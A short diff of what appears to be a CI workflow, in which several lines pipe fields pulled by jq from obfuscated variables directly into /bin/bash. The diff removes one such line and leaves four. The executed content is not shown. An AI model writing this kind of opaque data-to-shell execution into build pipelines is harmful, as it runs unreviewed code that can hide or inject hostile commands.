@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$j462" | jq -r .igx90504 | /bin/bash
           echo $vnq54 | jq -r .d9 | /bin/bash
           printf '%s' "$vhxmq2" | jq -r .fbl5515 | /bin/bash
-          echo $d536 | jq -r .im508 | /bin/bash
           echo $vrsr01047 | jq -r .tbpxf40 | /bin/bash
 
       - name: Save artifact
